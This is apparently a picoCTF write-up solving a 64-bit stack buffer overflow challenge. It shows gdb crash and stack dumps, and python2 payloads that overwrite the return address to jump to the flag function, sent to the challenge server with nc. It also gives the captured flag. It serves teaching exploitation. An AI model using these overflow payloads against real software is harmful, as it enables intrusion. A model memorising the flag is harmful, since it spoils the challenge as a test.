# `x-sixty-what`

## Description

Overflow x64 code

Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this [program](https://artifacts.picoctf.net/c/192/vuln).

Download [source](https://artifacts.picoctf.net/c/192/vuln.c)

```bash
nc saturn.picoctf.net 50079
```


## Fuzzing

We notice that `#define BUFFSIZE 64` so we can crash it immediataly by:

```bash
python2 -c "print('U' * 64 + '1234')"
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234


gdb ./vuln-64
Reading symbols from ./vuln-64...

(gdb) b *(vuln +29)
Breakpoint 1 at 0x401ece: file vuln.c, line 26.

(gdb) r
Starting program: vuln-64 
Welcome to 64-bit. Give me a string that gets you the flag: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234

(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
main (argc=<error reading variable: Cannot access memory at address 0x7f0034333225>, 
    argv=<error reading variable: Cannot access memory at address 0x7f0034333219>) at vuln.c:36
```

## Stack

```
(gdb) i r $rsp
rsp            0x7fffffffd698      0x7fffffffd698
(gdb) i r $rbp
rbp            0x7fffffffd6d8      0x7fffffffd6d8
```

So the size is 64 in decimal.

Send a payload with 6 digits:

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: vuln-64 
Welcome to 64-bit. Give me a string that gets you the flag: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUAAAAAA

Breakpoint 1, vuln () at vuln.c:26
26      }
(gdb) x/20xg $rsp
0x7fffffffd698: 0x5555555555555555      0x5555555555555555
0x7fffffffd6a8: 0x5555555555555555      0x5555555555555555
0x7fffffffd6b8: 0x5555555555555555      0x5555555555555555
0x7fffffffd6c8: 0x5555555555555555      0x5555555555555555
0x7fffffffd6d8: 0x0000414141414141      0x0000000000401f37
0x7fffffffd6e8: 0x00007fffffffd838      0x0000000100000000
0x7fffffffd6f8: 0x000003e8004c1018      0x0000000000402f20
0x7fffffffd708: 0x0000000000402750      0x0000000000000000
0x7fffffffd718: 0x0000000100000000      0x00007fffffffd838
0x7fffffffd728: 0x0000000000401ed1      0x0000000000000000

```

Locally, when running agains our own compiled version of `./vuln.c`, we're able to retrieve the debug flag:

```bash
python2 -c "print('U' * 72 + '\x35\x1e\x40')" | ./vuln-64
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{some_flag}
[1]    222188 done                              python2 -c "print('U' * 72 + '\x35\x1e\x40')" | 
       222189 segmentation fault (core dumped)  ./vuln-64

```

Finally got it to work after seeing the 2nd hint:

>Jump to the second instruction (the one after the first push) in the flag function, if you're getting mysterious segmentation faults.

```bash
cat <(python2 -c "print('U' * 72 + '\x3b\x12\x40')") - | nc saturn.picoctf.net 52707
Welcome to 64-bit. Give me a string that gets you the flag: 
picoCTF{b1663r_15_b3773r_11c407bc}
```